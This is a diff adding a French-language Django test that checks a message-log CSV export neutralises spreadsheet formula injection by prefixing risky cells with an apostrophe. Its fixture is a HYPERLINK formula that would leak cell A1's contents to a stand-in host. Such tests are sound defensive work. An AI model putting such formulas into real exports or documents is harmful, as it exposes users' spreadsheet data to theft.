@@ -78,3 +78,23 @@ def test_le_client_exporte_son_journal_sur_une_periode(client, membre):
 def test_une_periode_absente_ou_trop_longue_est_refusee(client, membre, periode):
     client.force_login(membre)
     assert client.get("/journal/export", periode).status_code == 400
+
+
+def test_un_texte_qui_ressemble_a_une_formule_ne_s_execute_pas_dans_le_tableur(client, membre):
+    """Le texte d'un message peut venir d'un tiers (SMS entrant, contenu saisi
+    par un membre) : une cellule qui commencerait par =, +, -, @, une
+    tabulation ou un retour chariot serait exécutée par un tableur. Elle sort
+    précédée d'une apostrophe ; un numéro +226... reste tel quel."""
+    boutique = membre.client
+    piege = '=HYPERLINK("http://exemple.invalid/?"&A1;"Cliquez")'
+    _message(boutique, piege, timedelta(hours=3))
+    client.force_login(membre)
+    aujourd_hui = timezone.localdate()
+    reponse = client.get(
+        "/journal/export",
+        {"debut": f"{aujourd_hui - timedelta(days=1)}", "fin": f"{aujourd_hui}"},
+    )
+    entete, *lignes = _lire(reponse)
+    textes = [ligne[entete.index("texte")] for ligne in lignes]
+    assert "'" + piege in textes and piege not in textes
+    assert {ligne[entete.index("numero")] for ligne in lignes} == {"+22670123456"}
